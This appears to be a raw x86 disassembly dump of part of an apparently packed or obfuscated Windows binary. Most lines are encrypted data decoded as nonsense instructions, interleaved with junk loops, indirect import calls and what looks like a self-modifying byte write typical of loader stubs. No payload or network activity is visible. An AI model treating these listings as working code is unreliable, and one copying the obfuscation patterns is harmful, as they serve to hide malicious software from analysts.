  406353:	cmp    eax,0x8c678e5
  406358:	ficomp WORD PTR ss:[ecx-0x2e4fc29e]
  40635f:	ret    0xdb32
  406362:	(bad)  
  406363:	dec    edi
  406364:	loope  0x40630f
  406366:	scas   al,BYTE PTR es:[edi]
  406367:	cwde   
  406368:	and    dl,cl
  40636a:	dec    ebp
  40636b:	(bad)  
  40636c:	icebp  
  40636d:	sub    BYTE PTR [eax],cl
  40636f:	into   
  406370:	or     eax,0xdad12ba0
  406375:	and    al,0x7a
  406377:	or     BYTE PTR [esi-0x491a7dc5],bh
  40637d:	imul   edx,edx,0xf3f737bb
  406383:	pushf  
  406384:	xor    eax,0xe301523f
  406389:	or     BYTE PTR [eax+0x6ccd3147],bl
  40638f:	sbb    esi,edx
  406391:	adc    BYTE PTR [eax+0x41],cl
  406394:	dec    bh
  406396:	mov    bl,0xde
  406398:	iret   
  406399:	cmp    al,0xe0
  40639b:	pop    ebx
  40639c:	xchg   edx,eax
  40639d:	mov    BYTE PTR [eax],al
  40639f:	mov    BYTE PTR [ecx-0x1d2b852],dl
  4063a5:	jo     0x40636e
  4063a7:	jb     0x40640f
  4063a9:	out    0x46,eax
  4063ab:	push   esp
  4063ac:	xor    BYTE PTR [edi+0x59053b55],bl
  4063b2:	mov    BYTE PTR [ecx+0x6f],dh
  4063b5:	in     al,dx
  4063b6:	loop   0x406357
  4063b8:	push   DWORD PTR [ebp-0xc]
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0xd6e0,0x8e
  4063d1:	mov    DWORD PTR [ebp+0x7e7e31d4],esi
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40638d
  4063dc:	outs   dx,BYTE PTR ds:[esi]
  4063dd:	cmp    ebp,0x27c99ad0
  4063e3:	sbb    eax,DWORD PTR [edi-0x776174ab]
  4063e9:	js     0x406409
  4063eb:	xchg   edx,eax
  4063ec:	ret    0x727b
  4063ef:	push   es
  4063f0:	xlat   BYTE PTR ds:[ebx]
  4063f1:	int3   
  4063f2:	dec    ebp
  4063f3:	sub    al,0xed
  4063f5:	ret    
  4063f6:	dec    DWORD PTR [eax+0x18]
  4063f9:	call   0x2291378e
  4063fe:	xchg   dl,dl
  406400:	sbb    eax,0xa69866e5
  406405:	xchg   ebp,eax
  406406:	aas    
  406407:	jmp    0x64a2175b
  40640c:	adc    eax,0xa7c606ad
  406411:	rcl    BYTE PTR [ecx],0x6
  406414:	jno    0x4063da
  406416:	out    0xf1,al
  406418:	repnz mov ah,0x21
  40641b:	test   DWORD PTR [esi+0x59],0x3387bb12
  406422:	fstp   QWORD PTR [ecx+0x69]
  406425:	adc    ebx,esp
  406427:	push   ebp
  406428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406429:	iret   
  40642a:	imul   ecx,DWORD PTR [ecx-0x3a],0x2e
  40642e:	adc    al,0xac
  406430:	mov    dl,0xeb
  406432:	mov    DWORD PTR [esi],ecx
  406434:	clc    
  406435:	push   0x4e3346c5
  40643a:	add    BYTE PTR [esi+0x16],ah
  40643d:	sub    eax,0x24242905
  406442:	shl    DWORD PTR [ecx+edx*4],cl
  406445:	push   ds
  406446:	and    eax,0x2f9ce4b8
  40644b:	out    dx,al
  40644c:	ret    0xda8f
  40644f:	cmp    BYTE PTR [ebx+edx*4],al
  406452:	test   cl,dl
  406454:	and    DWORD PTR [ebx],eax
  406456:	xor    eax,0xfba847f7
  40645b:	adc    DWORD PTR [edx+0x5b781a57],eax
  406461:	inc    ecx
  406462:	sbb    dh,BYTE PTR [ebp+0x7a2329b5]
  406468:	push   edx
  406469:	rcl    DWORD PTR [esi-0x3b42a383],cl
  40646f:	cmp    esp,edi
  406471:	pop    ebp
  406472:	pop    ds
  406473:	dec    ecx
  406474:	or     BYTE PTR [bp+di+0x4588],cl
  406479:	and    al,0xee
  40647b:	out    dx,al
  40647c:	xchg   DWORD PTR [edi+edi*8],eax
  40647f:	mov    ss,WORD PTR [ebx+edi*1-0x27f91f26]
  406486:	jl     0x4064a9
  406488:	xor    DWORD PTR [ebx],ebx
  40648a:	jne    0x406450
  40648c:	adc    al,dh
  40648e:	bnd call 0xe364e811
  406494:	mov    cl,0x8b
  406496:	sar    DWORD PTR cs:[edi+0x44],cl
  40649a:	mov    al,0x2f
  40649c:	loopne 0x4064b0
  40649e:	aam    0x84
  4064a0:	lock push cs
  4064a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064a3:	pop    edx
  4064a4:	daa    
  4064a5:	add    eax,0xa08c95f
  4064aa:	retf   
  4064ab:	iret   
  4064ac:	fisub  DWORD PTR [edx+0x7441c6db]
  4064b2:	push   ebp
  4064b3:	jp     0x406446
  4064b5:	inc    ebx
  4064b6:	into   
  4064b7:	inc    ecx
  4064b8:	xchg   esi,eax
  4064b9:	jle    0x40649e
  4064bb:	push   ds
  4064bc:	mov    al,0xf0
  4064be:	fmul   QWORD PTR fs:[ebx+0x22]
  4064c2:	(bad)  
  4064c3:	bound  ebp,QWORD PTR [edi+eax*2+0x5d]
  4064c7:	inc    ebx
  4064c8:	push   esi
  4064c9:	pop    ebx
  4064ca:	ins    BYTE PTR es:[edi],dx
  4064cb:	sub    al,0x4
  4064cd:	ss mov al,0xe9
  4064d0:	in     al,0xb3
  4064d2:	test   al,0x90
  4064d4:	push   ds
  4064d5:	adc    ebx,DWORD PTR [edi+0x11aad469]
  4064db:	xchg   esi,eax
  4064dc:	ror    bh,cl
  4064de:	jge    0x40653a
  4064e0:	or     al,0x10
  4064e2:	ja     0x406510
  4064e4:	jg     0x406545
  4064e6:	xor    bh,BYTE PTR [eax-0x519719c5]
  4064ec:	popf   
  4064ed:	(bad)  
  4064ee:	push   es
  4064ef:	mov    ebp,0x48982cdb
  4064f4:	int    0xa5
  4064f6:	xor    eax,0x3def9a0b
  4064fb:	xor    edi,DWORD PTR [edx]
  4064fd:	dec    eax
  4064fe:	dec    eax
  4064ff:	add    DWORD PTR [ebp+0xd484f4d],eax
  406505:	call   0x778bead8
  40650a:	jge    0x4064d0
  40650c:	cmp    DWORD PTR ds:0xbcd3fa34,eax
  406512:	ror    DWORD PTR [ecx+eiz*8-0x459d78b6],1
  406519:	cdq    
  40651a:	add    BYTE PTR [ebx-0x2b],al
  40651d:	xor    edi,DWORD PTR [ecx]
  40651f:	and    edx,eax
  406521:	pop    edi
  406522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406523:	lahf   
  406524:	add    eax,0xf44cbb79
  406529:	inc    ecx
  40652a:	pop    ebx
  40652b:	ins    BYTE PTR es:[edi],dx
  40652c:	int3   
  40652d:	jmp    0x406521
  40652f:	push   es
  406530:	imul   esp,DWORD PTR [esi],0xbadd814
  406536:	test   al,0x92
  406538:	stos   BYTE PTR es:[edi],al
  406539:	or     dl,cl
  40653b:	pop    ds
  40653c:	retf   0xd320
  40653f:	pop    esi
  406540:	repz sar DWORD PTR [ebx+ecx*8-0x1c],1
  406545:	arpl   WORD PTR [ecx],sp
  406547:	mov    cl,0xe8
  406549:	fild   WORD PTR ds:0x4172f10d
  40654f:	jle    0x4064d4
  406551:	and    BYTE PTR [eax],al
  406553:	(bad)  
  406554:	imul   edx
  406556:	adc    eax,0x3c3d6974
  40655b:	cld    
  40655c:	cmp    al,0x6a
  40655e:	mov    cl,0xb
  406560:	inc    esp
  406561:	xor    BYTE PTR [esi+0x53bcd8f8],dh
  406567:	mov    al,ss:0x4a58bf76
  40656d:	dec    edi
  40656e:	sub    eax,0xc717fb17
  406573:	adc    eax,0x5e9b1253
  406578:	xchg   edx,eax
  406579:	into   
  40657a:	out    dx,al
  40657b:	es cwde 
  40657d:	out    0x4c,al
  40657f:	and    ebp,DWORD PTR [edi-0x1976474b]
  406585:	fwait
  406586:	setae  BYTE PTR [esi]
  406589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658a:	or     ebx,DWORD PTR [ebx+0x7e0e9d8d]
  406590:	add    eax,0x4ff5bc0c
  406595:	call   0xe8a0:0xd0ac19ee
  40659c:	lds    esp,FWORD PTR [ecx-0x5f2299a]
  4065a2:	jb     0x406601
  4065a4:	rol    BYTE PTR [esi],0x78
  4065a7:	sar    BYTE PTR [edx+0x27],cl
  4065aa:	ja     0x4065c9
  4065ac:	retf   
  4065ad:	jp     0x406576
  4065af:	fwait
  4065b0:	add    ebx,DWORD PTR [esi+0x6911de9f]
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x2bc257a6]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406620
  40660b:	xchg   edx,eax
  40660c:	mov    edi,DWORD PTR [eax+0x39c0c348]
  406612:	or     al,0xe5
  406614:	das    
  406615:	daa    
  406616:	ss out dx,eax
  406618:	aad    0x20
  40661a:	cmp    eax,0x4d3e7277
  40661f:	or     eax,0xa480479b
  406624:	xchg   edi,eax
  406625:	aas    
  406626:	out    dx,al
  406627:	or     al,0x27
  406629:	add    al,0x67
  40662b:	out    0xbb,eax
  40662d:	aas    
  40662e:	adc    ch,BYTE PTR fs:[edx-0x5e0e7212]
  406635:	in     al,0x86
  406637:	or     eax,0x41fdf7ef
  40663c:	iret   
  40663d:	ja     0x406654
  40663f:	xchg   edx,eax
  406640:	into   
  406641:	inc    ebp
  406642:	mov    edx,DWORD PTR [ebp+edi*4-0x10]
  406646:	mov    ds:0xebcb4cfc,al
  40664b:	pop    ebx
  40664c:	pop    ds
  40664d:	dec    esp
  40664e:	ds push ss
  406650:	mov    ah,0xcb
  406652:	(bad)  
  406653:	int3   
  406654:	call   0xec16:0x6ff09548
  40665b:	push   0x33bb6a36
  406660:	xchg   esp,eax
  406661:	dec    esi
  406662:	arpl   WORD PTR [ebp-0x540d11b2],cx
  406668:	popf   
  406669:	dec    esi
  40666a:	into   
  40666b:	or     eax,0x4b37be9f
  406670:	add    edi,DWORD PTR [ebx-0x3acf2304]
  406676:	xchg   ebx,eax
  406677:	adc    eax,0x3ca735e6
  40667c:	stos   BYTE PTR es:[edi],al
  40667d:	or     ecx,DWORD PTR [ebp+0x71]
  406680:	sub    DWORD PTR [ecx],esi
  406682:	mov    ?,esp
  406684:	mov    ds:0x993d84ff,eax
  406689:	imul   ecx,edi,0x61
  40668c:	or     al,0x81
  40668e:	in     eax,0xac
  406690:	mov    ss,WORD PTR [ebx]
  406692:	add    al,0x53
  406694:	inc    edi
  406695:	in     eax,0x18
  406697:	pop    ecx
  406698:	push   esp
  406699:	sub    al,0x73
  40669b:	pop    ecx
  40669c:	push   edi
  40669d:	sti    
  40669e:	inc    esi
  40669f:	push   ds
  4066a0:	lods   eax,DWORD PTR ds:[esi]
  4066a1:	(bad)  
  4066a2:	std    
  4066a3:	pushf  
  4066a4:	into   
  4066a5:	fild   QWORD PTR [eax]
  4066a7:	and    DWORD PTR [edi],ecx
  4066a9:	push   es
  4066aa:	or     ecx,ebp
  4066ac:	lds    esp,FWORD PTR [ecx+eax*1+0x74615782]
  4066b3:	(bad)  
  4066b4:	int    0x7a
  4066b6:	lock int3 
  4066b8:	sahf   
  4066b9:	cli    
  4066ba:	jmp    0xb36d:0x9498ec07
  4066c1:	inc    eax
  4066c2:	adc    bh,BYTE PTR [ebx]
  4066c4:	inc    eax
  4066c5:	and    ebx,esi
  4066c7:	lock dec edx
  4066c9:	sub    BYTE PTR [esp+edx*1-0x2509bbb],ch
  4066d0:	cmp    DWORD PTR [ebp-0x4a9486cb],esi
  4066d6:	hlt    
  4066d7:	xor    al,0xb4
  4066d9:	stc    
  4066da:	aas    
  4066db:	loop   0x4066c2
  4066dd:	mov    bl,0x4a
  4066df:	and    ebp,DWORD PTR [edx-0x7a]
  4066e2:	pop    esp
  4066e3:	lea    edi,[ebx]
  4066e5:	iret   
  4066e6:	lods   eax,DWORD PTR ds:[esi]
  4066e7:	adc    BYTE PTR ds:0xd6aa6231,ah
  4066ed:	dec    edx
  4066ee:	cli    
  4066ef:	and    BYTE PTR [edi+0x69],ch
  4066f2:	fcom   QWORD PTR [edx+0x48bcee81]
  4066f8:	mov    cl,0x86
  4066fa:	cmp    al,0x4c
  4066fc:	retf   0x7218
  4066ff:	into   
  406700:	rol    BYTE PTR [edx+0x667caded],0x6e
  406707:	xor    esp,DWORD PTR [esi+0x3c61a4a8]
  40670d:	ret    0xd42a
  406710:	ds das 
  406712:	mov    al,0xfe
  406714:	out    0x85,eax
  406716:	xor    DWORD PTR [ecx+0x3a909f3c],eax
  40671c:	sbb    bl,BYTE PTR [eax+0x6d]
  40671f:	fs imul esi,esp,0x3be640b6
  406726:	in     al,dx
  406727:	jb     0x406795
  406729:	cld    
  40672a:	xchg   ebx,eax
  40672b:	sub    DWORD PTR ds:0xcbb11647,0x77
  406732:	ror    BYTE PTR [eax],1
  406734:	pop    edi
  406735:	adc    al,0xdc
  406737:	pop    esp
  406738:	rcl    dl,1
  40673a:	xchg   dh,dh
  40673c:	into   
  40673d:	mov    DWORD PTR [ecx-0x64],eax
  406740:	mov    esi,0x7827f6b9
  406745:	mov    ds,WORD PTR [ecx+ebx*1-0x2ae9324b]
  40674c:	loopne 0x406722
  40674e:	xchg   esi,eax
  40674f:	xlat   BYTE PTR ds:[ebx]
  406750:	ror    BYTE PTR [esi],1
  406752:	push   0xffffffbc
  406754:	nop
  406755:	xchg   edx,eax
  406756:	(bad)
  40675a:	lds    edi,FWORD PTR [eax+0x5e25a53c]
  406760:	sbb    ebx,DWORD PTR [edi+eiz*8]
  406763:	mov    BYTE PTR [ebx+0x6318a7c7],bh
  406769:	sti    
  40676a:	sahf   
  40676b:	xchg   esp,eax
  40676c:	mov    ch,0x5
  40676e:	arpl   WORD PTR fs:[ebp-0x57],ax
  406772:	test   eax,0x29742e22
  406777:	out    0xde,al
  406779:	mov    ebp,0x96d62c19
  40677e:	in     al,dx
  40677f:	jg     0x4067d9
  406781:	pop    ds
  406782:	or     eax,0x112d5b90
  406787:	(bad)  
  406788:	sbb    eax,0x3454e33e
  40678d:	jnp    0x406716
  40678f:	dec    ebx
  406790:	xchg   edx,eax
  406791:	mov    ah,0xa3
  406793:	dec    edx
  406794:	retf   
  406795:	fistp  DWORD PTR [esi-0x6bb0ad0c]
  40679b:	mov    ebp,0x2a30630c
  4067a0:	push   cs
  4067a1:	nop
  4067a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a3:	adc    al,0x9
  4067a5:	cmp    edi,0xffffff87
  4067a8:	int    0xb0
  4067aa:	out    dx,eax
  4067ab:	adc    BYTE PTR [esi-0x79],dl
  4067ae:	call   0xfd65:0x61d7aa67
  4067b5:	adc    BYTE PTR [edi+0x29],dl
  4067b8:	cmc    
  4067b9:	sub    DWORD PTR [ebp-0xf47c72e],edi
  4067bf:	and    edi,edi
  4067c1:	pop    ebp
  4067c2:	adc    DWORD PTR [edx+0x5cf2e53f],ebx
  4067c8:	cmp    dl,bh
  4067ca:	add    cl,BYTE PTR [ecx-0x36867522]
  4067d0:	loop   0x406811
  4067d2:	mov    bh,0x39
  4067d4:	push   ecx
  4067d5:	cwde   
  4067d6:	dec    ebp
  4067d7:	or     BYTE PTR [ebp+0x67f811b8],0xb5
  4067de:	jno    0x4067bd
  4067e0:	mov    esi,DWORD PTR [ebx]
  4067e2:	fld    st(0)
  4067e4:	jb     0x40679e
  4067e6:	gs (bad) 
  4067e8:	int    0xff
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xcae8:0x13cf6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	dec    ebp
  406865:	and    ebx,DWORD PTR [ecx+0x3b]
  406868:	ret    0xc67e
  40686b:	push   esi
  40686c:	std    
  40686d:	dec    esp
  40686e:	fs jmp 0x7789:0x4dd02814
  406876:	pop    ss
  406877:	retf   
  406878:	das    
  406879:	jmp    0xa702e5e
  40687e:	das    
  40687f:	ds ret 
  406881:	ficom  WORD PTR [ecx-0x6559c39c]
  406887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406888:	push   edx
  406889:	mov    bh,0xb7
  40688b:	in     al,dx
  40688c:	les    edx,FWORD PTR [ebx]
  40688e:	std    
  40688f:	xchg   BYTE PTR [ebx+0x4a19aa13],bl
  406895:	pop    edx
  406896:	and    dl,dl
  406898:	push   ebx
  406899:	ud1    eax,DWORD PTR [edx]
  40689c:	mov    ah,0xd1
  40689e:	popf   
  40689f:	mov    ds:0x1bd3fc3d,eax
  4068a4:	mov    eax,0xf736c0bc
  4068a9:	jge    0x4068f0
  4068ab:	mov    dl,0x96
  4068ad:	jge    0x406928
  4068af:	inc    esp
  4068b0:	push   esi
  4068b1:	das    
  4068b2:	add    BYTE PTR [ecx+0x28],ch
  4068b5:	scas   al,BYTE PTR es:[edi]
  4068b6:	sbb    BYTE PTR [edi+0x60],bh
  4068b9:	push   esp
  4068ba:	cmp    DWORD PTR [ebx-0x42],ebp
  4068bd:	es leave 
  4068bf:	add    eax,0x9197b673
  4068c4:	shr    BYTE PTR [esp+ecx*1],0xc6
  4068c8:	jmp    0x35af:0x992aadf1
  4068cf:	sub    dl,dh
  4068d1:	leave  
  4068d2:	mov    eax,ds:0x5de66a68
  4068d7:	in     al,0xe9
  4068d9:	cmp    BYTE PTR [ebp-0x2b],cl
  4068dc:	jbe    0x406942
  4068de:	fist   WORD PTR [ebx+eax*1+0x4]
  4068e2:	in     eax,dx
  4068e3:	mov    BYTE PTR [edi],cl
  4068e5:	nop
  4068e6:	neg    BYTE PTR [ecx+esi*8-0x38eeb883]
  4068ed:	pop    ebx
  4068ee:	jle    0x40696f
  4068f0:	mov    ds:0xf1019ace,eax
  4068f5:	shl    DWORD PTR [edi-0x56],cl
  4068f8:	mov    ds:0xf6e6185f,al
  4068fd:	lahf   
  4068fe:	cs (bad) 
  406900:	dec    edi
  406901:	xchg   edi,eax
  406902:	(bad)  
  406903:	in     eax,dx
  406904:	gs pop esi
  406906:	xchg   ecx,eax
  406907:	pop    esi
  406908:	repnz inc ebx
  40690a:	ins    DWORD PTR es:[edi],dx
  40690b:	xchg   edx,eax
  40690c:	sbb    dl,dh
  40690e:	fmul   st,st(7)
  406910:	adc    BYTE PTR [ecx+0x0],dl
  406913:	lds    ebx,FWORD PTR [ecx]
  406915:	(bad)  
  406916:	mov    ecx,0x89de555b
  40691b:	fistp  DWORD PTR [ebx+ebp*1-0x55]
  40691f:	xor    eax,0x16386593
  406924:	push   edx
  406925:	aaa    
  406926:	mov    ds:0x969c075f,al
  40692b:	pop    ebx
  40692c:	or     ebp,DWORD PTR [edi]
  40692e:	shr    BYTE PTR [ecx],cl
  406930:	and    BYTE PTR [esi+0x4a399005],cl
  406936:	dec    esp
  406937:	aaa    
  406938:	pop    eax
  406939:	or     ecx,esp
  40693b:	sbb    BYTE PTR [ebx],dl
  40693d:	imul   eax,DWORD PTR [eax-0x7f],0xa9503cbb
  406944:	xchg   esi,eax
  406945:	call   0xe419:0x70b75d45
  40694c:	mov    esi,0x3f9cd8d9
  406951:	xchg   ecx,eax
  406952:	sub    DWORD PTR [edi+0x12],eax
  406955:	cli    
  406956:	arpl   WORD PTR [ecx-0x2a],bx
  406959:	jp     0x4068f8
  40695b:	xchg   ebp,eax
  40695c:	ror    ecx,1
  40695e:	push   edx
  40695f:	mov    ch,ch
  406961:	leave  
  406962:	jge    0x40690d
  406964:	mov    eax,ds:0x62575d1a
  406969:	mov    al,ds:0x6e91b9ff
  40696e:	dec    edi
  40696f:	cmp    ecx,DWORD PTR [ebx]
  406971:	cmp    edx,eax
  406973:	in     al,0xda
  406975:	mov    esi,0x1ef54cb2
  40697a:	pop    es
  40697b:	lods   al,BYTE PTR ds:[esi]
  40697c:	xchg   ecx,edx
  40697e:	and    eax,0x1213fdc7
  406983:	or     dh,bh
  406985:	out    dx,al
  406986:	out    0x6c,al
  406988:	lea    ebx,[ebx-0x20]
  40698b:	add    bl,dl
  40698d:	add    ebp,esp
  40698f:	or     eax,0x6b6b8ce7
  406994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406995:	gs dec ecx
  406997:	rol    DWORD PTR [eax+0x79],0xc5
  40699b:	xor    edi,eax
  40699d:	mov    ebp,0x933068bb
  4069a2:	or     DWORD PTR [ebx+0x17daa67a],0xbd6654e3
  4069ac:	stc    
  4069ad:	fsub   DWORD PTR [esp+eiz*8]
  4069b0:	aad    0x34
  4069b2:	xor    DWORD PTR [eax+0x75],edx
  4069b5:	mov    cs,WORD PTR [ebx]
  4069b7:	sbb    eax,DWORD PTR [edi-0x6a]
  4069ba:	adc    BYTE PTR [edi-0x1e37e203],dl
  4069c0:	aad    0xa4
  4069c2:	xchg   edi,eax
  4069c3:	mov    edi,DWORD PTR [eax+0x34]
  4069c6:	xchg   BYTE PTR [edx+0x63],cl
  4069c9:	mov    cl,0x5
  4069cb:	jmp    0xcc46:0x1dca6083
  4069d2:	mov    ebp,0xe4700ff6
  4069d7:	cmp    al,0x58
  4069d9:	pusha  
  4069da:	mov    eax,ds:0x16ceec7
  4069df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e0:	cmp    al,0x26
  4069e2:	mov    cl,0x93
  4069e4:	dec    esi
  4069e5:	mov    BYTE PTR [ecx],ah
  4069e7:	mul    DWORD PTR [esi-0x25]
  4069ea:	psadbw mm3,QWORD PTR [ebx-0x78]
  4069ee:	sbb    BYTE PTR [eax-0x2271c70e],dh
  4069f4:	dec    esi
  4069f5:	push   eax
  4069f6:	mov    eax,ds:0xd0bafbab
  4069fb:	pop    edi
  4069fc:	xor    ah,al
  4069fe:	cmp    al,0x18
  406a00:	fsubr  st(6),st
  406a02:	push   ecx
  406a03:	daa    
  406a04:	pop    esp
  406a05:	and    dh,BYTE PTR [ebp+0x709b053d]
  406a0b:	cmp    BYTE PTR [esi-0x5a0f6e34],dh
  406a11:	sbb    DWORD PTR [ebx+0x3948a01a],0xab79052d
  406a1b:	cmp    BYTE PTR [eax+0x71],ch
  406a1e:	mov    ch,BYTE PTR [edi]
  406a20:	mov    cl,0x3c
  406a22:	xor    eax,0x94b071d3
  406a27:	cmp    BYTE PTR [edi+eiz*8-0x4d],cl
  406a2b:	cmp    edx,edi
  406a2d:	or     eax,0x5f0bfdf1
  406a32:	pop    ss
  406a33:	inc    edi
  406a34:	test   eax,0x260c7bb0
  406a39:	enter  0xc298,0x8e
  406a3d:	add    BYTE PTR [edx],cl
  406a3f:	pop    eax
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x1b2a7504
  406bfe:	mov    bl,0x44
  406c00:	cmp    bh,BYTE PTR gs:[esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406bf9
  406c09:	mov    esi,0xa0fb0e38
  406c0e:	jmp    0x45c5c1a0
  406c13:	mov    ds:0xffb62a42,al
